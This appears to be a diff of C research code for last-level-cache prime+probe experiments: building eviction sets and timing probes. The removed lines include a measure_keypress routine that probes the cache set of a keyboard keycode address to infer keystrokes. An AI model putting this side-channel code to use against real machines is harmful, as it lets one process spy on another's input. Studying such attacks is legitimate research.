@@ -129,118 +129,35 @@ void test_eviction_and_pp(void) {
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
 }
 
-void test_find_all_eviction_sets(uintptr_t addr) {
+void test_find_all_eviction_sets() {
   mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
   if (mapping_start == MAP_FAILED) {
     perror("map");
     return;
   }
-
-  int set = pa_to_set(addr, EVERGLADES);
-
-  EvictionSet **es_list = get_all_slices_eviction_sets(mapping_start, set);
-
-  sleep(1);
-
-  NumList *probe_times = new_num_list(EVERGLADES_ASSOCIATIVITY);
+  EvictionSet **es_list = get_all_slices_eviction_sets(mapping_start, 0);
+  printf("Reduction complete: ready to prime+probe\n");
+  sleep(5);
   unsigned int core_id = 0;
+  NumList *list = new_num_list(16);
   for (int i = 0; i < 4; i++) {
     access_set(es_list[i]);
     uint64_t start = __rdtscp(&core_id);
     while (__rdtscp(&core_id) - start < 10000)
       ;
-    probe(es_list[i], probe_times);
-    print_num_list(probe_times);
-    clear_num_list(probe_times);
-    sleep(1);
+    probe(es_list[i], list);
+    print_num_list(list);
+    clear_num_list(list);
   }
 
-  free_num_list(probe_times);
   free_es_list(es_list);
-
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
-}
-
-void measure_keypress(uintptr_t pa) {
-  printf("%p\n", (void *)pa);
-
-  signal(SIGINT, handle_sigint);
-
-  // map 64 * 2 MB pages to get 256 candidate lines
-  mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
-                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
-  if (mapping_start == MAP_FAILED) {
-    perror("map");
-    return;
-  }
-
-  printf("memory mapped: %p\n", mapping_start);
-
-  CacheLineSet *cl_set;
-  get_eviction_set_from_slices(pa, EVERGLADES_ASSOCIATIVITY, &mapping_start,
-                               &cl_set);
-  int threshold = threshold_from_flush(mapping_start);
-  printf("cache threshold: %d\n", threshold);
-  uint8_t value = 0;
-  while (1) {
-
-    value >>= 1;
-    /* prime */
-    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
-      *(volatile CacheLine *)cl_set->cache_lines[i];
-    }
-    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
-      *(volatile CacheLine *)
-           cl_set->cache_lines[EVERGLADES_ASSOCIATIVITY - 1 - i];
-    }
-
-    /* busy wait for 10000 cycles */
-    unsigned int core_id = 0;
-    uint64_t wait_time_start = __rdtscp(&core_id);
-    while (__rdtscp(&core_id) - wait_time_start < WAIT_INTERVAL)
-      ;
-
-    /* probe */
-    uint64_t access_times[EVERGLADES_ASSOCIATIVITY];
-    uint64_t general_time[EVERGLADES_ASSOCIATIVITY];
-    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
-      general_time[i] = __rdtscp(&core_id);
-      access_times[i] = time_load((volatile uint8_t *)(cl_set->cache_lines[i]));
-    }
-
-    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
-      printf("%ld ", access_times[i]);
-    }
-
-    printf("\n");
-
-    /* evaluate and interpret result */
-    int hit = 0;
-    for (int i = 0; i < EVERGLADES_ASSOCIATIVITY; i++) {
-      if (access_times[i] > threshold) {
-        value += (1 << 7);
-      }
-    }
-
-    // printf("%08x\n", value);
-  }
 }
 
 int main() {
   // test_eviction_set();
   // test_covert_channel();
   // test_eviction_and_pp();
-  // FILE *inFile;
-  // inFile = fopen("pa.txt", "r");
-  // if (inFile == NULL) {
-  //   perror("fopen");
-  //   exit(1);
-  // }
-  //
-  // uintptr_t pa;
-  // fscanf(inFile, "%lx", &pa);
-  // printf("%p\n", (void *)pa);
-  // fclose(inFile);
-  test_find_all_eviction_sets(KBD_KEYCODE_ADDR);
+  test_find_all_eviction_sets();
 }
